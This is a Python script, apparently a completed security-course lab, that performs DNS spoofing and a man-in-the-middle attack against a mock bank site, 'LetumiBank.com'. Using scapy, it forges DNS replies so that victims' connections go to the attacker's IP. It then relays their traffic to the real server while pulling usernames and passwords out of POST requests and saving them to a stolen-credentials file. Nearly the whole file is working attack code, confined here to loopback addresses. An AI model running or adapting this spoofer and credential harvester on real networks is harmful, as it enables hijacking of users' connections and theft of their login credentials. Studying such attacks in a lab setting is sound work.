import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	strd = str(client_data)
	client_data_list = strd.split("'")
	username = client_data_list[1]
	password = client_data_list[3]
	log_credentials(username, password)


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data

	while True:
		# accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		# read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.

		conn, address = client_socket.accept()
		bank_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		bank_socket.bind((client_socket.getsockname()[0],0))
		bank_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))
		
		data = conn.recv(8*1024)
		data_string = str(data)
		
		if "POST" in data_string and "username" in data_string and "password" in data_string:
			check_credentials(data)
		if "POST" in data_string and "/post_logout" in data_string:
			exit(0)
		bank_socket.send(data)
		data_from_bank = bank_socket.recv(8*1024)
		conn.send(data_from_bank)
		
		
		


def dns_callback(packet, extra_args):
	# Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	if DNS in packet and packet[DNS].qr == 0:
		dnsrr = DNSRR(rdata=extra_args[0], rrname=HOSTNAME, ttl=5)
		response_dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, an=dnsrr, qr=1, aa=1)
		response = IP(src=packet[IP].dst, dst=packet[IP].src, ttl=5)/UDP(sport=53, dport=packet[UDP].sport)/DNS()
		response[DNS] = response_dns
		send(response)
		handle_tcp_forwarding(extra_args[1], packet[IP].src, HOSTNAME)




def sniff_and_spoof(source_ip):
	# Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((source_ip, WEB_PORT))
	s.listen(5)


	# sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments.
	sniff(iface="lo", prn=lambda p: dns_callback(p, (source_ip, s)))



def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
